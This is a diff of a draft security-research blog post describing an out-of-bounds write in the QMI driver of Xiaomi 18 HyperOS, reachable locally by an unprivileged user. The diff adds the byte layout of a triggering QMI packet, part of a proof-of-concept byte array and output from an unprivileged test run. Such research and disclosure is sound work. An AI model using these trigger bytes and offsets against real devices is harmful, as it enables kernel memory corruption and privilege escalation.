@@ -1,12 +1,11 @@
 ---
-title: "Xiaomi 18 HyperOS - CP-to-AP / local unpriv out-of-bounds write in qmi_helpers 2/2"
+title: "Xiaomi 18 HyperOS - out-of-bounds write in QMI 2/2"
 published: 2026-11-10
-tags: ["linux", "nasm", "pwn", "0day", "poc", "research", "baseband", "kernel"]
+tags: ["linux", "nasm", "pwn", "0day", "poc", "research", "baseband", "kernel", "qmi"]
 category: "research"
 draft: true
-description: Write-up about an out-of-bounds write I found in qmi_helpers device shipped in the Xiaomi 18 which turns out to be a LPE vector as well if you are using the QMI driver.
+description: Write-up about an out-of-bounds write I found in the QMI device shipped in the Xiaomi 18 which turns out to be a LPE vector as well if you are using the QMI driver.
 ---
-
 
 In my previous post I digged into the rmnet driver, especially the version shipped in the recent Xiaomi 18 releases. For this blogpost I am targeting [Qualcomm MSM Interface](https://github.com/qualcomm/qmi-framework) (QMI).
 
@@ -19,7 +18,7 @@ QMI is a promising target because it has features a vulnerability research loves
 
 # Introduction
 
-For this post we do not dig to perform a lot of reversing because the [LineageOs repo](https://github.com/zorn-trees/android_kernel_xiaomi_sm8650-modules/tree/lineage-23.2) containing the drivers used by the almost same chipset (`Qualcomm Snapdragon 8 Elite Gen 3` vs `Qualcomm Snapdragon 8 Elite Gen 6`) so I will use both these open source vendor drivers for the rca / dynamic replay of the bug as well as the upstream QMI driver (but that's a slightly different story :0).
+For this post we do not need to perform a lot of reversing because the [LineageOS repo](https://github.com/zorn-trees/android_kernel_xiaomi_sm8650-modules/tree/lineage-23.2)  is already containing the drivers used by the almost same chipset (`Qualcomm Snapdragon 8 Elite Gen 3` vs `Qualcomm Snapdragon 8 Elite Gen 6`) so I will use both these open source vendor drivers for the rca / dynamic replay of the bug combined with the upstream QMI driver.
 
 The first thing I tried to understand about this driver was how easy it was to reach from the baseband. To process QMI packets from the baseband we need to go through two different layers: GLINK and QRTR.
 
@@ -140,7 +139,7 @@ static struct qmi_msg_handler client_handlers[] = {
 };
 ```
 
-Actually the bug is just here in the client handlers registration, `ipa3_install_fltr_rule_req_msg_data_v01_ei` represents an array of structs 
+Actually the bug is just here in the client handlers registration, `ipa3_install_fltr_rule_req_msg_data_v01_ei` represents *element information* (ei) about the TLV structs the QMI client will parse.
 
 The flags define client's behaviour:
 ```c
@@ -342,90 +341,68 @@ static int qmi_decode(const struct qmi_elem_info *ei_array, void *out_c_struct,
 }
 ```
 
-The function will iterate through our input and parse the TLV structs into the 8-byte dest and we have full control over `in_buf_len` (the only restriction is for our packet to be > `sizeof(qmi_header)`). That is the out-of-bounds write. For example if we select `tlv_type = 0x11` it will search for the first 0x11 entry in `ipa3_install_fltr_rule_req_msg_data_v01_ei`, its offset evaluates to `0x3508` whill will cause a `memcpy(dest+0x3508, &opt_flag_value, sizeof(u8));`, an oob.
+The function will parse TLV into the 8-byte dest, we have full control over `in_buf_len` (the only restriction is for our packet to be > `sizeof(qmi_header)`).
 
-# Exploitation
+For example this QMI packet selects the tlv_type `0x10`:
+```c
+QMI message
+  +0x00 u8  type       = 4       QMI_INDICATION
+  +0x01 u16 txn_id     = 1
+  +0x03 u16 msg_id     = 0x003a  firewall-rules indication
+  +0x05 u16 msg_len    = 176     TLV bytes
+  +0x07                         start of TLV
 
-Actually the bug is pretty interesting because we have to chain out-of-bounds writes in a non-linear way on fixed offsets. 
-
-Let's imagine we want to write to `dest + offsetof(struct ipa_install_fltr_rule_req_msg_v01, xlat_filter_indices_list_len)` which is (`dest + 0x3524`). First its `tlv_type` is 0x14:
+TLV 0x10
+  +0x00 u8  type       = 0x10    tlv_type
+  +0x01 u16 length     = 173     value bytes
+  +0x03 u8  count      = 1       one rule
+  +0x04 u32 first word = 0x41414141
+  +0x08..+0xaf                 168 remaining rule bytes, all zero
 ```
+
+It means that the following structs will parse the TLV:
+```c
+{
+    .data_type	= QMI_OPT_FLAG,
+    .elem_len	= 1,
+    .elem_size	= sizeof(uint8_t),
+    .array_type	= NO_ARRAY,
+    .tlv_type	= 0x10,
+    .offset		= offsetof( // 0
+        struct ipa_install_fltr_rule_req_msg_v01,
+        filter_spec_list_valid),
+},
 {
     .data_type	= QMI_DATA_LEN,
     .elem_len	= 1,
     .elem_size	= sizeof(uint8_t),
     .array_type	= NO_ARRAY,
-    .tlv_type	= 0x14,
-    .offset		= offsetof(
+    .tlv_type	= 0x10,
+    .offset		= offsetof( // 4
         struct ipa_install_fltr_rule_req_msg_v01,
-        xlat_filter_indices_list_len),
+        filter_spec_list_len),
+},
+{
+    .data_type	= QMI_STRUCT,
+    .elem_len	= QMI_IPA_MAX_FILTERS_V01,
+    .elem_size	= sizeof(struct ipa_filter_spec_type_v01),
+    .array_type	= VAR_LEN_ARRAY,
+    .tlv_type	= 0x10,
+    .offset		= offsetof( // 8
+        struct ipa_install_fltr_rule_req_msg_v01,
+        filter_spec_list),
+    .ei_array	= ipa_filter_spec_type_data_v01_ei,
 },
 ```
 
-So we will have to iterate through every single 0x14 elements before, causing out-of-bounds writes at other fixed offsets. Furthermore, `QMI_DATA_LEN` only allows to write `(u32)((u8)payload)` at a time so this is not the best. `QMI_UNSIGNED_4_BYTE` is much more interesting (and will be called anyway because it is responsible of writing the value part of the TLV payload):
+I will write to `dest+0` for the first `QMI_OPT_FLAG`, to `dest+4` for the second `QMI_DATA_LEN` and finally it will write `0x41414141` + 168 null bytes to `dest+8`. Which means that in terms of exploitability, for tlv_type 0x10, we have a forced layout of:
 ```c
-/**
- * qmi_decode_basic_elem() - Decodes elements of basic/primary data type
- * @buf_dst: Buffer to store the decoded element.
- * @buf_src: Buffer containing the elements in QMI wire format.
- * @elem_len: Number of elements to be decoded.
- * @elem_size: Size of a single instance of the element to be decoded.
- *
- * This function decodes the "elem_len" number of elements in QMI wire format,
- * each of size "elem_size" bytes from the source buffer "buf_src" and stores
- * the decoded elements in the destination buffer "buf_dst". The elements are
- * of primary data type which include u8 - u64 or similar. This
- * function returns the number of bytes of decoded information.
- *
- * Return: The total size of the decoded data elements, in bytes, on success or
- * negative errno on error.
- */
-static int qmi_decode_basic_elem(void *buf_dst, const void *buf_src,
-				 u32 elem_len, u32 elem_size)
-{
-	u32 i, rc = 0;
-
-	for (i = 0; i < elem_len; i++) {
-		switch (elem_size) {
-		case sizeof(u8):
-			QMI_ENCDEC_DECODE_U8(buf_dst, buf_src);
-			break;
-		case sizeof(u16):
-			QMI_ENCDEC_DECODE_U16(buf_dst, buf_src);
-			break;
-		case sizeof(u32):
-			QMI_ENCDEC_DECODE_U32(buf_dst, buf_src);
-			break;
-		case sizeof(u64):
-			QMI_ENCDEC_DECODE_U64(buf_dst, buf_src);
-			break;
-		default:
-			pr_err("%s: Unrecognized element size\n", __func__);
-			return -EINVAL;
-		}
-
-		rc += elem_size;
-	}
-
-	return rc;
-}
+victim+0: 1
+victim+4: data_len
+victim+8: linear oob
 ```
 
-It allows a linear overflow on from `dest+0xa240` on `64 * 4` bytes if we select `tlv_type = 0x17`:
-```c
-{
-    .data_type      = QMI_UNSIGNED_4_BYTE,
-    .elem_len       = QMI_IPA_MAX_FILTERS_V01, // 64
-    .elem_size      = sizeof(uint32_t), // 4
-    .array_type       = VAR_LEN_ARRAY,
-    .tlv_type       = 0x17,
-    .offset         = offsetof(
-        struct ipa_install_fltr_rule_req_msg_v01,
-        ul_firewall_indices_list), // 0xa240
-},
-```
-
-But we will have to iter through the previous `0x17` `QMI_DATA_LEN` and `QMI_OPT_FLAG` before which might make the exploit rather unreliable.
+But the layout is not exactly the same for every tlv_type. Most of the other types actually allow us to perform non-linear out-of-bounds writes.
 
 # LPE vector?
 
@@ -445,6 +422,21 @@ Funny thing with this bug is that you can trigger the bug on a system using the 
 #endif
 
 /* QMI indication 0x003a, TLV 0x10 with one filter rule. */
+/*
+QMI message (offsets relative to QMI)
+  +0x00 u8  type       = 4       QMI_INDICATION
+  +0x01 u16 txn_id     = 1
+  +0x03 u16 msg_id     = 0x003a  firewall-rules indication
+  +0x05 u16 msg_len    = 176     TLV bytes
+  +0x07                         start of TLV
+
+TLV 0x10 (offsets relative to TLV)
+  +0x00 u8  type       = 0x10    filter_spec_list
+  +0x01 u16 length     = 173     value bytes
+  +0x03 u8  count      = 1       one rule
+  +0x04 u32 first word = 0x41414141
+  +0x08..+0xaf                 168 remaining rule bytes, all zero
+*/
 static const unsigned char rule_qmi[183] = {
 	0x04, 0x01, 0x00, 0x3a, 0x00, 0xb0, 0x00,
 	0x10, 0xad, 0x00, 0x01,
@@ -499,7 +491,7 @@ int main(void)
 # Conclusion
 
 I reproduced the oob in unicorn on the drivers of the Xiaomi 18 as well as in qemu, this is the local version but the CP-to-AP is similar in terms of outcome:
-```
+```c
 running unprivileged AF_QIPCRTR test
 unprivileged sender: uid=1000 euid=1000
 send port 0x4000: 183 (ok)
